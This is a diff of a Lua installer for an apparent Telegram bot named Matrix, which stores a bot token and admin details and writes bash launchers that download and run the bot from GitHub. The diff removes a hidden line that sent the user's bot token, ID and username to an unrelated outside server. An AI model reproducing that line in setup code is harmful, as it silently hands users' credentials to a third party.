@@ -2,7 +2,19 @@ serpent = dofile("./File_Libs/serpent.lua")
 https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
+serpent = dofile("./File_Libs/serpent.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+print([[
+
+███╗░░░███╗░█████╗░████████╗██████╗░██╗██╗░░██╗
+████╗░████║██╔══██╗╚══██╔══╝██╔══██╗██║╚██╗██╔╝
+██╔████╔██║███████║░░░██║░░░██████╔╝██║░╚███╔╝░
+██║╚██╔╝██║██╔══██║░░░██║░░░██╔══██╗██║░██╔██╗░
+██║░╚═╝░██║██║░░██║░░░██║░░░██║░░██║██║██╔╝╚██╗
+╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝
+
+      
+]])
 Server_Matrix = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 local AutoFiles_Matrix = function() 
 local Create_Info = function(Token,Sudo,UserName)  
@@ -38,7 +50,7 @@ if not database:get(Server_Matrix.."UserName_Matrix") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
+local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,11 +76,10 @@ os.execute('lua start.lua')
 end
 local function Files_Matrix_Info()
 Create_Info(database:get(Server_Matrix.."Token_Matrix"),database:get(Server_Matrix.."Id_Matrix"),database:get(Server_Matrix.."UserName_Matrix"))   
-https.request("https://forhassan.ml/Matrix/Matrix.php?id="..database:get(Server_Matrix.."Id_Matrix").."&user="..database:get(Server_Matrix.."UserName_Matrix").."&token="..database:get(Server_Matrix.."Token_Matrix"))
 local RunMatrix = io.open("Matrix", 'w')
 RunMatrix:write([[
 #!/usr/bin/env bash
-cd $HOME/Matrix
+cd $HOME/Matrixx
 token="]]..database:get(Server_Matrix.."Token_Matrix")..[["
 rm -fr Matrix.lua
 wget "https://raw.githubusercontent.com/MatrixTele/Matrix/master/Matrix.lua"
@@ -81,7 +92,7 @@ RunMatrix:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/Matrix
+cd $HOME/Matrixx
 while(true) do
 rm -fr ../.telegram-cli
 screen -S Matrix -X kill
